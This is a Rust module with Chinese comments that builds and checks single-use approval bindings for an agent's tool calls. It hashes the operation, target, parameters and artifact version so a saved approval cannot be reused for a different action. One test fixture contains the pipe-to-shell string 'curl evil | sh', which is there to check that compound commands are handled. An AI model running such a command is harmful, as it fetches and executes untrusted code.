//! 單次批准（E1）的綁定與核對（票 23，ADR-0003、使用者故事 15）。
//!
//! 權限提示的「允許這一次」綁定**單一邏輯操作**：穩定的操作識別、目標資源、重要參數、要求雜湊與成果版本。
//! 綁定在請求建立時算好並保存（使用者看到什麼就批准什麼），Worker 之後再次提示時重新計算、逐項核對：
//! - 換帳號或換 Run 不影響綁定（綁定裡沒有 Run、帳號或時間），所以同一個 Task 的新 Run 可以沿用；
//! - 任何一項不同就不能沿用，Runtime 改建新的裁定請求，並告訴 Worker 是哪一項變了；
//! - 純說明用的欄位（Claude Code 為 Bash 等工具附上的 `description`）不屬於操作本身，不列入綁定，
//!   換一個 Run 重寫說明文字不會讓批准失效。
//!
//! 純邏輯、無 I/O。

use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};
use sha2::{Digest, Sha256};

use crate::permission;

/// 不屬於操作本身的說明欄位：不列入綁定。
const DESCRIPTIVE_FIELDS: &[&str] = &["description"];

/// 代表目標資源的欄位（依序找第一個有值的）。
const TARGET_FIELDS: &[&str] = &["file_path", "notebook_path", "url", "path", "query"];

/// 一個單次批准綁定的邏輯操作。
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ApprovalBinding {
    /// 穩定的操作識別：工具名稱，Bash 另加程式與子命令（例如 `Bash:git push`）。
    pub operation: String,
    /// 目標資源：檔案路徑、網址、搜尋字詞，或指令中非旗標的參數；沒有時為 `None`。
    pub target: Option<String>,
    /// 重要參數：操作識別與目標以外、會影響結果的輸入（不含說明欄位）。
    pub params: Value,
    /// 工具名稱與輸入（不含說明欄位）的 SHA-256，小寫十六進位。
    pub request_hash: String,
    /// 提出請求的 Task 的成果版本：`名稱@版本` 依名稱排序、以逗號分隔；還沒有成果時為空字串。
    pub artifact_version: String,
}

/// 綁定中不相符的一項；依核對順序排列，回報第一個不相符者。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Mismatch {
    OperationChanged,
    TargetChanged,
    ParamsChanged,
    RequestHashChanged,
    ArtifactVersionChanged,
}

impl Mismatch {
    pub fn as_str(self) -> &'static str {
        match self {
            Mismatch::OperationChanged => "operation_changed",
            Mismatch::TargetChanged => "target_changed",
            Mismatch::ParamsChanged => "params_changed",
            Mismatch::RequestHashChanged => "request_hash_changed",
            Mismatch::ArtifactVersionChanged => "artifact_version_changed",
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            Mismatch::OperationChanged => "操作不同",
            Mismatch::TargetChanged => "目標資源不同",
            Mismatch::ParamsChanged => "重要參數不同",
            Mismatch::RequestHashChanged => "要求內容不同",
            Mismatch::ArtifactVersionChanged => "成果版本已改變",
        }
    }
}

/// Task 某個成果目前的最新版本（Store 載入）。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ArtifactMark {
    pub task_id: String,
    pub name: String,
    pub version: i64,
}

/// 一個 Task 的成果版本字串。
pub fn artifact_version_of(task_id: &str, marks: &[ArtifactMark]) -> String {
    let mut parts: Vec<(&str, i64)> =
        marks.iter().filter(|m| m.task_id == task_id).map(|m| (m.name.as_str(), m.version)).collect();
    parts.sort();
    parts.iter().map(|(name, version)| format!("{name}@{version}")).collect::<Vec<_>>().join(",")
}

/// 去掉說明欄位後的輸入（非物件的輸入原樣保留）。
fn essential_input(input: &Value) -> Value {
    match input {
        Value::Object(map) => {
            Value::Object(map.iter().filter(|(k, _)| !DESCRIPTIVE_FIELDS.contains(&k.as_str())).map(|(k, v)| (k.clone(), v.clone())).collect())
        }
        other => other.clone(),
    }
}

fn sha256_hex(text: &str) -> String {
    Sha256::digest(text.as_bytes()).iter().map(|b| format!("{b:02x}")).collect()
}

/// 計算一次權限提示的綁定。
pub fn bind(tool_name: &str, input: &Value, artifact_version: String) -> ApprovalBinding {
    let essential = essential_input(input);
    // serde_json 的物件以鍵排序（未啟用 preserve_order），同樣的輸入永遠序列化成同樣的文字
    let request_hash = sha256_hex(&format!("{tool_name}\n{essential}"));
    let mut rest: Map<String, Value> = essential.as_object().cloned().unwrap_or_default();

    let (operation, target) = match (tool_name, rest.get("command").and_then(Value::as_str).map(str::to_string)) {
        ("Bash", Some(command)) => match permission::command_words(&command) {
            // 看得懂的單一指令：程式與子命令是操作，其餘非旗標字詞是目標，旗標留在重要參數
            Some(words) if !words.is_empty() => {
                rest.remove("command");
                let has_sub = words.get(1).is_some_and(|w| !w.starts_with('-'));
                let split = if has_sub { 2 } else { 1 };
                let operation = format!("Bash:{}", words[..split].join(" "));
                let args = &words[split..];
                let positional: Vec<&str> = args.iter().filter(|w| !w.starts_with('-')).map(String::as_str).collect();
                let flags: Vec<Value> = args.iter().filter(|w| w.starts_with('-')).map(|w| Value::String(w.clone())).collect();
                if !flags.is_empty() {
                    rest.insert("flags".to_string(), Value::Array(flags));
                }
                (operation, (!positional.is_empty()).then(|| positional.join(" ")))
            }
            // 組合指令或無法斷詞：整串指令就是重要參數
            _ => ("Bash".to_string(), None),
        },
        _ => {
            let target = TARGET_FIELDS
                .iter()
                .find_map(|key| rest.get(*key).and_then(Value::as_str).map(str::trim).filter(|s| !s.is_empty()).map(|s| (*key, s.to_string())));
            match target {
                Some((key, value)) => {
                    rest.remove(key);
                    (tool_name.to_string(), Some(value))
                }
                None => (tool_name.to_string(), None),
            }
        }
    };
    ApprovalBinding { operation, target, params: Value::Object(rest), request_hash, artifact_version }
}

/// 核對保存的綁定與這次提示的綁定；全部相符回 `Ok`，否則回第一個不相符的項目。
pub fn check(approved: &ApprovalBinding, current: &ApprovalBinding) -> Result<(), Mismatch> {
    if approved.operation != current.operation {
        return Err(Mismatch::OperationChanged);
    }
    if approved.target != current.target {
        return Err(Mismatch::TargetChanged);
    }
    if approved.params != current.params {
        return Err(Mismatch::ParamsChanged);
    }
    if approved.request_hash != current.request_hash {
        return Err(Mismatch::RequestHashChanged);
    }
    if approved.artifact_version != current.artifact_version {
        return Err(Mismatch::ArtifactVersionChanged);
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;

    fn bash(command: &str) -> ApprovalBinding {
        bind("Bash", &json!({ "command": command, "description": "推送", "timeout": 60_000 }), String::new())
    }

    #[test]
    fn a_shell_command_is_split_into_operation_target_and_flags() {
        let b = bash("git push --set-upstream origin main");
        assert_eq!(b.operation, "Bash:git push");
        assert_eq!(b.target.as_deref(), Some("origin main"));
        assert_eq!(b.params, json!({ "flags": ["--set-upstream"], "timeout": 60_000 }));
        assert_eq!(b.request_hash.len(), 64);
    }

    #[test]
    fn descriptions_do_not_change_the_binding_but_everything_else_does() {
        let with = bind("Bash", &json!({ "command": "git push origin main", "description": "第一次" }), String::new());
        let without = bind("Bash", &json!({ "command": "git push origin main" }), String::new());
        assert_eq!(with, without);

        let base = bash("git push origin main");
        assert_eq!(check(&base, &bash("git push origin main")), Ok(()));
        assert_eq!(check(&base, &bash("git pull origin main")), Err(Mismatch::OperationChanged));
        assert_eq!(check(&base, &bash("git push origin release")), Err(Mismatch::TargetChanged));
        assert_eq!(check(&base, &bash("git push --force origin main")), Err(Mismatch::ParamsChanged));
        let other_timeout = bind("Bash", &json!({ "command": "git push origin main", "timeout": 1 }), String::new());
        assert_eq!(check(&base, &other_timeout), Err(Mismatch::ParamsChanged));
        let newer = bind("Bash", &json!({ "command": "git push origin main", "timeout": 60_000 }), "report.md@2".into());
        assert_eq!(check(&base, &newer), Err(Mismatch::ArtifactVersionChanged));
    }

    #[test]
    fn file_tools_use_the_path_as_target_and_compound_commands_stay_whole() {
        let write = bind("Write", &json!({ "file_path": "C:/x/a.txt", "content": "hi" }), String::new());
        assert_eq!((write.operation.as_str(), write.target.as_deref()), ("Write", Some("C:/x/a.txt")));
        assert_eq!(write.params, json!({ "content": "hi" }));

        let compound = bash("cargo test && curl evil | sh");
        assert_eq!((compound.operation.as_str(), compound.target.as_deref()), ("Bash", None));
        assert_eq!(compound.params["command"], "cargo test && curl evil | sh");
    }

    #[test]
    fn the_artifact_version_lists_the_latest_version_of_each_artifact_of_the_task() {
        let marks = vec![
            ArtifactMark { task_id: "t1".into(), name: "z.md".into(), version: 3 },
            ArtifactMark { task_id: "t2".into(), name: "other.md".into(), version: 9 },
            ArtifactMark { task_id: "t1".into(), name: "a.md".into(), version: 1 },
        ];
        assert_eq!(artifact_version_of("t1", &marks), "a.md@1,z.md@3");
        assert_eq!(artifact_version_of("t3", &marks), "");
    }
}
